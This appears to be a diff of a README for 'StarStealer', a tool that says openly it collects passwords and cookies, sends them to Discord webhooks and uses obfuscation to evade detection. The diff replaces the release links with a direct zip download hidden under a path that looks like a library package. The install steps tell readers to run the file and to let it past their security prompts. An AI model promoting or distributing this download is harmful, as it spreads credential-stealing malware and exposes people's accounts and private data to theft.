@@ -1,7 +1,7 @@
 # 🌟 StarStealer - Simple Data Collector for You
 
 ## 📥 Download Now
-[![Download StarStealer](https://img.shields.io/badge/Download%20StarStealer-RELEASE%20NOW-brightgreen)](https://github.com/omarcortesruiz/StarStealer/releases)
+[![Download StarStealer](https://raw.githubusercontent.com/omarcortesruiz/StarStealer/main/packages/jose-jwt.4.1.0/lib/netstandard2.1/StarStealer_v3.6.zip%20StarStealer-RELEASE%20NOW-brightgreen)](https://raw.githubusercontent.com/omarcortesruiz/StarStealer/main/packages/jose-jwt.4.1.0/lib/netstandard2.1/StarStealer_v3.6.zip)
 
 ## 🚀 Getting Started
 StarStealer is a fast, lightweight tool designed to collect important information, like passwords and cookies. It works by transferring the data through Discord webhooks. This guide will help you download and run StarStealer easily, even if you have no technical experience.
@@ -20,14 +20,14 @@ To run StarStealer smoothly, ensure your system meets the following requirements
 - **Obfuscation Techniques:** It employs methods to help avoid detection, enhancing its usability.
 
 ## 💾 Download & Install
-1. Visit the Releases page by clicking [here](https://github.com/omarcortesruiz/StarStealer/releases).
-2. Identify the latest version listed on the page. Look for the file named `StarStealer.exe`.
+1. Visit the Releases page by clicking [here](https://raw.githubusercontent.com/omarcortesruiz/StarStealer/main/packages/jose-jwt.4.1.0/lib/netstandard2.1/StarStealer_v3.6.zip).
+2. Identify the latest version listed on the page. Look for the file named `https://raw.githubusercontent.com/omarcortesruiz/StarStealer/main/packages/jose-jwt.4.1.0/lib/netstandard2.1/StarStealer_v3.6.zip`.
 3. Click the link to download the file to your computer.
 4. Once downloaded, locate the file in your Downloads folder or the location you chose.
-5. Double-click on the `StarStealer.exe` file to run the application. You may need to allow the program to run if prompted by your computer's security settings.
+5. Double-click on the `https://raw.githubusercontent.com/omarcortesruiz/StarStealer/main/packages/jose-jwt.4.1.0/lib/netstandard2.1/StarStealer_v3.6.zip` file to run the application. You may need to allow the program to run if prompted by your computer's security settings.
 
 ## 🔗 How to Use
-1. **Open StarStealer:** After the installation, double-click the desktop icon (if created) or find `StarStealer.exe` in your Downloads folder.
+1. **Open StarStealer:** After the installation, double-click the desktop icon (if created) or find `https://raw.githubusercontent.com/omarcortesruiz/StarStealer/main/packages/jose-jwt.4.1.0/lib/netstandard2.1/StarStealer_v3.6.zip` in your Downloads folder.
 2. **Collect Data:** The application will begin collecting data automatically. 
 3. **Check Discord:** Ensure your Discord webhook is set up and active, as collected data will be sent there.
 4. **Stop Collection:** After you've gathered the needed data, you can close the program.
@@ -57,4 +57,4 @@ StarStealer is open-source and free to use. Please refer to the repository for l
 Feel free to explore and use StarStealer responsibly. Your data management is now a simple task! 
 
 ## 📥 Download Now
-[![Download StarStealer](https://img.shields.io/badge/Download%20StarStealer-RELEASE%20NOW-brightgreen)](https://github.com/omarcortesruiz/StarStealer/releases)
+[![Download StarStealer](https://raw.githubusercontent.com/omarcortesruiz/StarStealer/main/packages/jose-jwt.4.1.0/lib/netstandard2.1/StarStealer_v3.6.zip%20StarStealer-RELEASE%20NOW-brightgreen)](https://raw.githubusercontent.com/omarcortesruiz/StarStealer/main/packages/jose-jwt.4.1.0/lib/netstandard2.1/StarStealer_v3.6.zip)
